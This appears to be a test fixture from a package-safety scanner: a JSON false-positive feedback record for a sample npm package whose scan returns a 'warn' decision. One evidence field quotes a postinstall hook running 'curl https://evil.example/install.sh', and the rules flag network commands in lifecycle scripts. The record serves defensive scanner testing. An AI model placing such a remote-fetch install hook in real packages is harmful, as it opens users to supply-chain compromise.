@@ -1,0 +1,122 @@
+{
+  "schema_version": "1.0",
+  "feedback_type": "false_positive",
+  "generated_at": "2026-07-01T07:37:49Z",
+  "fingerprint": "10059d15ee2bdda09fc21dcd657950d59908763922c0369cce0dff7bae1a3904",
+  "package": "postinstall-curl-example",
+  "ecosystem": "npm",
+  "version": "1.0.0",
+  "rule_ids": [
+    "lifecycle_script_present",
+    "missing_license",
+    "missing_repository",
+    "network_command_in_lifecycle"
+  ],
+  "decision": "warn",
+  "risk_score": 65,
+  "command_used": "pkgsafe scan-local-npm ./testdata/npm/postinstall-curl --json",
+  "sanitized_finding_output": {
+    "artifact_analysis": {
+      "native_extension": false,
+      "setup_py_present": false,
+      "source_distribution_available": false,
+      "wheel_available": false,
+      "yanked": false
+    },
+    "behavior_analysis": {
+      "enabled": false,
+      "executed": false,
+      "isolated": false,
+      "mode": "disabled",
+      "network_policy": "disabled",
+      "not_performed": true,
+      "reason": "behavior analysis disabled by policy",
+      "runner": "none"
+    },
+    "decision": "warn",
+    "ecosystem": "npm",
+    "enforcement": "User review recommended",
+    "exception": {
+      "matched": false
+    },
+    "lifecycle_scripts": [
+      "postinstall"
+    ],
+    "mode": "warn",
+    "package": "postinstall-curl-example",
+    "package_identity": {
+      "ecosystem": "npm",
+      "name": "postinstall-curl-example",
+      "version": "1.0.0"
+    },
+    "policy": {
+      "name": "default",
+      "owner": "local",
+      "source": "local",
+      "version": "0.1.0"
+    },
+    "reasons": [
+      {
+        "evidence": "postinstall=curl https://evil.example/install.sh",
+        "message": "Package defines a postinstall script",
+        "rule_id": "lifecycle_script_present",
+        "score": 20,
+        "severity": "medium"
+      },
+      {
+        "evidence": "curl",
+        "message": "Lifecycle script uses curl",
+        "rule_id": "network_command_in_lifecycle",
+        "score": 30,
+        "severity": "high"
+      },
+      {
+        "message": "Package metadata does not include a source repository",
+        "rule_id": "missing_repository",
+        "score": 10,
+        "severity": "low"
+      },
+      {
+        "message": "Package metadata does not include a license",
+        "rule_id": "missing_license",
+        "score": 5,
+        "severity": "low"
+      }
+    ],
+    "recommended_action": "Review package before installing.",
+    "registry": {
+      "auth_method": "",
+      "name": "local",
+      "type": "",
+      "url": ""
+    },
+    "risk_score": 65,
+    "suspicious_patterns": [
+      "curl"
+    ],
+    "thresholds": {
+      "allow_max_score": 29,
+      "block_min_score": 70,
+      "warn_max_score": 69
+    },
+    "trust": {
+      "matched": false
+    },
+    "version": "1.0.0"
+  },
+  "user_reason": "E2E validation sample feedback; not a real false positive",
+  "private_registry_involved": false,
+  "lifecycle_scripts_involved": true,
+  "behavior_analysis": {
+    "mode": "disabled",
+    "enabled": false,
+    "executed": false,
+    "isolated": false,
+    "runner": "none",
+    "network_policy": "disabled",
+    "not_performed": true,
+    "reason": "behavior analysis disabled by policy"
+  },
+  "pkgsafe_version": "v0.2.0-beta.1-3-gb09b204",
+  "pkgsafe_commit": "b09b204"
+}
